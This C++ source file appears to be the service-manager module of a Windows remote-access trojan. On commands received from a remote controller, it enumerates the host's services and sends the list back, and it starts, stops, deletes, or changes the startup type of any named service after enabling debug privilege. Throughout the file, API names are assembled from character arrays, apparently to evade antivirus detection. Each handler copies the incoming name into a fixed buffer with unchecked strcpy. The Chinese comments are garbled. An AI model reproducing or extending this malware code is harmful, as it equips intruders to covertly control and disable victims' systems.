// SerManager.cpp: implementation of the CSerManager class.
//
//////////////////////////////////////////////////////////////////////

#include "../stdafx.h"
#include "../Declare.h"   //��̬���ÿ⺯��
#include "SerManager.h"
#include "until.h"
#include "../Myfunction.h"  //�Զ��庯��

extern Myfunction *Gyfunction;
//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////

CSerManager::CSerManager(CClientSocket *pClient) : CManager(pClient)
{
	SendServicesList();
}

CSerManager::~CSerManager()
{

}
void CSerManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();
	switch (lpBuffer[0])
	{
	case COMMAND_SSLIST:
		SendServicesList();
		break;
	case COMMAND_STARTSERVERICE:  //��������
		StartStopService((LPBYTE)lpBuffer + 1, nSize - 1,TRUE);
		break;
	case COMMAND_STOPSERVERICE:   //ֹͣ����
		StartStopService((LPBYTE)lpBuffer + 1, nSize - 1,NULL);
		break;
	case COMMAND_DELETESERVERICE:  //ɾ������
		DeleteService((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_AUTOSERVERICE:     //�Զ�����
		DisableService((LPBYTE)lpBuffer + 1, nSize - 1, 2);
		break;
	case COMMAND_HANDSERVERICE:     //�ֶ�����
		DisableService((LPBYTE)lpBuffer + 1, nSize - 1, 1);
		break;
	case COMMAND_DISABLESERVERICE:  //���÷���
		DisableService((LPBYTE)lpBuffer + 1, nSize - 1, 0);
		break;
	}
}

void CSerManager::SendServicesList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getServerList();
	if (lpBuffer == NULL)
		return;	

	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	Send((LPBYTE)lpBuffer, pLocalSize(lpBuffer));
	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
	pLocalFree(lpBuffer);
}


BOOL EnablePri()
{
	HANDLE hToken;

	char CtxPW35[] = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n','\0'};
	OpenProcessTokenT pOpenProcessToken=(OpenProcessTokenT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW35);

    char CtxPW33[] = {'A','d','j','u','s','t','T','o','k','e','n','P','r','i','v','i','l','e','g','e','s','\0'};
    AdjustTokenPrivilegesT pAdjustTokenPrivileges=(AdjustTokenPrivilegesT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW33);

    char CtxPW34[] = {'L','o','o','k','u','p','P','r','i','v','i','l','e','g','e','V','a','l','u','e','A','\0'};
    LookupPrivilegeValueAT pLookupPrivilegeValueA=(LookupPrivilegeValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW34);
	char FBwWp06[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	GetLastErrorT pGetLastError=(GetLastErrorT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp06);
    char Wffkl01[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0'};
    GetCurrentProcessT pGetCurrentProcess=(GetCurrentProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl01);
	if ( pOpenProcessToken(pGetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&hToken) )
	{
		TOKEN_PRIVILEGES tkp;
		
		pLookupPrivilegeValueA( NULL,SE_DEBUG_NAME,&tkp.Privileges[0].Luid );//�޸Ľ���Ȩ��
		tkp.PrivilegeCount=1;
		tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		pAdjustTokenPrivileges( hToken,FALSE,&tkp,sizeof tkp,NULL,NULL );//֪ͨϵͳ�޸Ľ���Ȩ��
		
		return( (pGetLastError()==ERROR_SUCCESS) );

	}
	return true;
}

void CSerManager::DisableService(LPBYTE lpBuffer, UINT nSize, UCHAR strn)  // strn=0 ���� strn=1�Զ� strn=2�ֶ� 
{
	EnablePri();
	SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;

    char CtxPW61[] = {'O','p','e','n','S','C','M','a','n','a','g','e','r','A','\0'};
    OpenSCManagerAT pOpenSCManagerA=(OpenSCManagerAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW61);
//	scm=pOpenSCManagerA(NULL,NULL,GENERIC_EXECUTE);
	scm=pOpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
	
	char temp[500];
	char *ServerName=NULL;
	strcpy(temp,(char*)(lpBuffer));
	ServerName = temp;
	char HrFvD11[] = {'O','p','e','n','S','e','r','v','i','c','e','A','\0'};
	OpenServiceAT pOpenServiceA=(OpenServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD11);
//    service=pOpenServiceA(scm,ServerName,SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP);  // ��www����
	service=pOpenServiceA(scm,ServerName,SERVICE_ALL_ACCESS);  // ��www����

	char JwFNw12[] = {'Q','u','e','r','y','S','e','r','v','i','c','e','S','t','a','t','u','s','\0'};
	QueryServiceStatusT pQueryServiceStatus=(QueryServiceStatusT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw12);
    BOOL isSuccess=pQueryServiceStatus(service,&status);


    SC_LOCK sclLock; 
    DWORD  dwStartType; 
 
	char JwFNw15[] = {'L','o','c','k','S','e','r','v','i','c','e','D','a','t','a','b','a','s','e','\0'};
	LockServiceDatabaseT pLockServiceDatabase=(LockServiceDatabaseT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw15);
    sclLock = pLockServiceDatabase(scm); 

	if(strn==0)  //���÷���
	{
        dwStartType = SERVICE_DISABLED;
	}
	else if(strn==1)  //�ֶ�����
	{
		dwStartType = SERVICE_DEMAND_START;
	}
	else if(strn==2)  //�Զ�����
	{
		dwStartType = SERVICE_AUTO_START;
	}
 
	char VnUDS07[] = {'C','h','a','n','g','e','S','e','r','v','i','c','e','C','o','n','f','i','g','A','\0'};
	ChangeServiceConfigAT pChangeServiceConfigA=(ChangeServiceConfigAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS07);
    pChangeServiceConfigA( 
        service,        // handle of service 
        SERVICE_NO_CHANGE, // service type: no change 
        dwStartType,       // change service start type 
        SERVICE_NO_CHANGE, // error control: no change 
        NULL,              // binary path: no change 
        NULL,              // load order group: no change 
        NULL,              // tag ID: no change 
        NULL,              // dependencies: no change 
        NULL,              // account name: no change
		NULL,				// password: no change
		NULL);				//displayname 

	char VnUDS06[] = {'U','n','l','o','c','k','S','e','r','v','i','c','e','D','a','t','a','b','a','s','e','\0'};
	UnlockServiceDatabaseT pUnlockServiceDatabase=(UnlockServiceDatabaseT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS06);

	if(sclLock != NULL)
        pUnlockServiceDatabase(sclLock); 
	char HrFvD10[] = {'C','l','o','s','e','S','e','r','v','i','c','e','H','a','n','d','l','e','\0'};
    CloseServiceHandleT pCloseServiceHandle=(CloseServiceHandleT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD10);
	pCloseServiceHandle(service );
	pCloseServiceHandle(scm);
	
	// ����Sleep�£���ֹ����
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	pSleep(100);
	SendServicesList();
}

void CSerManager::DeleteService(LPBYTE lpBuffer, UINT nSize)   //ɾ������
{
	EnablePri();
	SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;

    char CtxPW61[] = {'O','p','e','n','S','C','M','a','n','a','g','e','r','A','\0'};
    OpenSCManagerAT pOpenSCManagerA=(OpenSCManagerAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW61);
	scm=pOpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);

	
	char temp[500];
	char *ServerName=NULL;
	strcpy(temp,(char*)(lpBuffer));
	ServerName = temp;
	DWORD _err = 0;
	char HrFvD11[] = {'O','p','e','n','S','e','r','v','i','c','e','A','\0'};
	OpenServiceAT pOpenServiceA=(OpenServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD11);
    service=pOpenServiceA(scm,ServerName,SERVICE_ALL_ACCESS);

	char Lfrfz02[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char FBwWp06[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	GetLastErrorT pGetLastError=(GetLastErrorT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp06);
	_err = pGetLastError();

	char JwFNw12[] = {'Q','u','e','r','y','S','e','r','v','i','c','e','S','t','a','t','u','s','\0'};
	QueryServiceStatusT pQueryServiceStatus=(QueryServiceStatusT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw12);
    BOOL isSuccess=pQueryServiceStatus(service,&status);

	char JwFNw10[] = {'C','o','n','t','r','o','l','S','e','r','v','i','c','e','\0'};
	ControlServiceT pControlService=(ControlServiceT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw10);
    if ( status.dwCurrentState!=SERVICE_STOPPED )
	{
		isSuccess=pControlService(service,SERVICE_CONTROL_STOP,&status);
	}

	char JwFNw11[] = {'D','e','l','e','t','e','S','e','r','v','i','c','e','\0'};
	DeleteServiceT pDeleteService=(DeleteServiceT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw11);
	isSuccess=pDeleteService(service);
	char HrFvD10[] = {'C','l','o','s','e','S','e','r','v','i','c','e','H','a','n','d','l','e','\0'};
    CloseServiceHandleT pCloseServiceHandle=(CloseServiceHandleT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD10);
	pCloseServiceHandle(service );
	pCloseServiceHandle(scm);
	
	// ����Sleep�£���ֹ����
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	pSleep(100);
	SendServicesList();

}

void CSerManager::StartStopService(LPBYTE lpBuffer, UINT nSize ,BOOL strp)  //���� ֹͣ����
{
	EnablePri();
	SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;

    char CtxPW61[] = {'O','p','e','n','S','C','M','a','n','a','g','e','r','A','\0'};
    OpenSCManagerAT pOpenSCManagerA=(OpenSCManagerAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW61);
//	scm=pOpenSCManagerA(NULL,NULL,GENERIC_EXECUTE);  // �򿪷���������
	scm=pOpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);  // �򿪷���������
	
	char temp[500];
	char *ServerName=NULL;
	strcpy(temp,(char*)(lpBuffer));
	ServerName = temp;
	char HrFvD11[] = {'O','p','e','n','S','e','r','v','i','c','e','A','\0'};
	OpenServiceAT pOpenServiceA=(OpenServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD11);
//    service=pOpenServiceA(scm,ServerName,SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP);  // ��www����
	service=pOpenServiceA(scm,ServerName,SERVICE_ALL_ACCESS);  // ��www����

	char JwFNw12[] = {'Q','u','e','r','y','S','e','r','v','i','c','e','S','t','a','t','u','s','\0'};
	QueryServiceStatusT pQueryServiceStatus=(QueryServiceStatusT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw12);
    BOOL isSuccess=pQueryServiceStatus(service,&status);
	char HrFvD09[] = {'S','t','a','r','t','S','e','r','v','i','c','e','A','\0'};
	StartServiceAT pStartServiceA=(StartServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD09);

	char JwFNw10[] = {'C','o','n','t','r','o','l','S','e','r','v','i','c','e','\0'};
	ControlServiceT pControlService=(ControlServiceT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw10);
	if(strp==TRUE)  //��������
	{
        if ( status.dwCurrentState==SERVICE_STOPPED )  //����ֹͣ״̬ ����������
		{
		    isSuccess=pStartServiceA(service,NULL,NULL);
		}
	}
	else    //ֹͣ����
	{
	    if ( status.dwCurrentState !=SERVICE_STOPPED )
		{
		    isSuccess=pControlService(service,SERVICE_CONTROL_STOP,&status);
		}
	}

	char HrFvD10[] = {'C','l','o','s','e','S','e','r','v','i','c','e','H','a','n','d','l','e','\0'};
    CloseServiceHandleT pCloseServiceHandle=(CloseServiceHandleT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD10);
	pCloseServiceHandle(service );
	pCloseServiceHandle(scm);
	
	// ����Sleep�£���ֹ����
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	pSleep(100);
	SendServicesList();

}


LPBYTE CSerManager::getServerList()
{	
	LPQUERY_SERVICE_CONFIG ServicesInfo = NULL;
	LPENUM_SERVICE_STATUS lpServices    = NULL; 
	LPBYTE			lpBuffer = NULL;
	DWORD    nSize = 0; 
	DWORD    n; 
	DWORD    nResumeHandle = 0; 
	DWORD	 dwServiceType = SERVICE_WIN32; 
	DWORD	 dwLength = 0;
	DWORD	 dwOffset = 0;
	char	 runway[256] = {0};
	char	 autorun[256] = {0};

	SC_HANDLE schSCManager = NULL; 
	BOOL     Flag = FALSE; 

	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);

    char CtxPW61[] = {'O','p','e','n','S','C','M','a','n','a','g','e','r','A','\0'};
    OpenSCManagerAT pOpenSCManagerA=(OpenSCManagerAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW61);
	schSCManager=pOpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);

	lpServices = (LPENUM_SERVICE_STATUS) pLocalAlloc(LPTR, 64*1024);        // Allocate Ram 

	char JwFNw08[] = {'E','n','u','m','S','e','r','v','i','c','e','s','S','t','a','t','u','s','A','\0'};
	EnumServicesStatusAT pEnumServicesStatusA=(EnumServicesStatusAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw08);
	pEnumServicesStatusA(schSCManager,
					   dwServiceType, 
					   SERVICE_STATE_ALL,
					   (LPENUM_SERVICE_STATUS)lpServices, 
						64 * 1024, 
						&nSize, 
						&n, 
						&nResumeHandle);

	lpBuffer = (LPBYTE)pLocalAlloc(LPTR, MAX_PATH);
	
	lpBuffer[0] = TOKEN_SSLIST;
	dwOffset = 1;

	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	char HrFvD11[] = {'O','p','e','n','S','e','r','v','i','c','e','A','\0'};
	OpenServiceAT pOpenServiceA=(OpenServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD11);

	char JwFNw09[] = {'Q','u','e','r','y','S','e','r','v','i','c','e','C','o','n','f','i','g','A','\0'};
	QueryServiceConfigAT pQueryServiceConfigA=(QueryServiceConfigAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw09);
	for (unsigned long i = 0; i < n; i++)  // Display The Services,��ʾ���еķ���
	{ 
		SC_HANDLE service = NULL;
		DWORD     nResumeHandle = 0; 

		service=pOpenServiceA(schSCManager,lpServices[i].lpServiceName,SERVICE_ALL_ACCESS);//�򿪵�ǰָ������ľ��

		ServicesInfo = (LPQUERY_SERVICE_CONFIG) pLocalAlloc(LPTR, 4*1024);        // Allocate Ram 

		pQueryServiceConfigA(service,ServicesInfo,4*1024,&nResumeHandle); //��ѯ������������

		if ( lpServices[i].ServiceStatus.dwCurrentState!=SERVICE_STOPPED) //����״̬
		{
			ZeroMemory(runway, sizeof(runway));
			plstrcatA(runway,"����");
		}
		else
		{
			ZeroMemory(runway, sizeof(runway));
			plstrcatA(runway,"ֹͣ");
		}

		if(2==ServicesInfo->dwStartType) //�������
		{
			ZeroMemory(autorun, sizeof(autorun));
			plstrcatA(autorun,"�Զ�");
		}
		if(3==ServicesInfo->dwStartType)
		{
			ZeroMemory(autorun, sizeof(autorun));
			plstrcatA(autorun,"�ֶ�");
		}
		if(4==ServicesInfo->dwStartType)
		{
			ZeroMemory(autorun, sizeof(autorun));
			plstrcatA(autorun,"����");
		}

/*		if (lpServices[i].ServiceStatus.dwCurrentState==SERVICE_RUNNING) //����״̬
		{
			ZeroMemory(runway, sizeof(runway));
			plstrcatA(runway,"����");
		}
		else 
		{
			ZeroMemory(runway, sizeof(runway));
		    plstrcatA(runway,"ֹͣ");
		}

		if(2==ServicesInfo->dwStartType) //�������
		{
			ZeroMemory(autorun, sizeof(autorun));
			plstrcatA(autorun,"�Զ�");
		}
		if(3==ServicesInfo->dwStartType)
		{
			ZeroMemory(autorun, sizeof(autorun));
			plstrcatA(autorun,"�ֶ�");
		}
		if(4==ServicesInfo->dwStartType)
		{
			ZeroMemory(autorun, sizeof(autorun));
			plstrcatA(autorun,"����");
		}
*/

	    char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	    lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
		dwLength = sizeof(DWORD) + plstrlenA(lpServices[i].lpDisplayName) 
		+ plstrlenA(ServicesInfo->lpBinaryPathName) + plstrlenA(lpServices[i].lpServiceName)
		+ plstrlenA(runway) + plstrlenA(autorun) + 2;
		// ������̫С�������·�����
		LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
		char FBwWp29[] = {'L','o','c','a','l','R','e','A','l','l','o','c','\0'};
	    LocalReAllocT pLocalReAlloc=(LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp29);
		if (pLocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)pLocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);

		if(plstrlenA(lpServices[i].lpDisplayName)>0)
		{
		    Gyfunction->my_memcpy(lpBuffer + dwOffset, lpServices[i].lpDisplayName, plstrlenA(lpServices[i].lpDisplayName) + 1);
		}
		dwOffset += plstrlenA(lpServices[i].lpDisplayName) + 1;//��ʵ����
		
		if(plstrlenA(lpServices[i].lpServiceName)>0)
		{
		    Gyfunction->my_memcpy(lpBuffer + dwOffset, lpServices[i].lpServiceName, plstrlenA(lpServices[i].lpServiceName) + 1);
		}
		dwOffset += plstrlenA(lpServices[i].lpServiceName) + 1;//��ʾ����

		if(plstrlenA(ServicesInfo->lpBinaryPathName)>0)
		{
		    Gyfunction->my_memcpy(lpBuffer + dwOffset, ServicesInfo->lpBinaryPathName, plstrlenA(ServicesInfo->lpBinaryPathName) + 1);
		}
		dwOffset += plstrlenA(ServicesInfo->lpBinaryPathName) + 1;//·��

		Gyfunction->my_memcpy(lpBuffer + dwOffset, runway, plstrlenA(runway) + 1);//����״̬
		dwOffset += plstrlenA(runway) + 1;			

		Gyfunction->my_memcpy(lpBuffer + dwOffset, autorun, plstrlenA(autorun) + 1);//������״̬
		dwOffset += plstrlenA(autorun) + 1;
	}
	char HrFvD10[] = {'C','l','o','s','e','S','e','r','v','i','c','e','H','a','n','d','l','e','\0'};
    CloseServiceHandleT pCloseServiceHandle=(CloseServiceHandleT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD10);
	pCloseServiceHandle(schSCManager);
	char FBwWp29[] = {'L','o','c','a','l','R','e','A','l','l','o','c','\0'};
	LocalReAllocT pLocalReAlloc=(LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp29);
	lpBuffer = (LPBYTE)pLocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;						
}

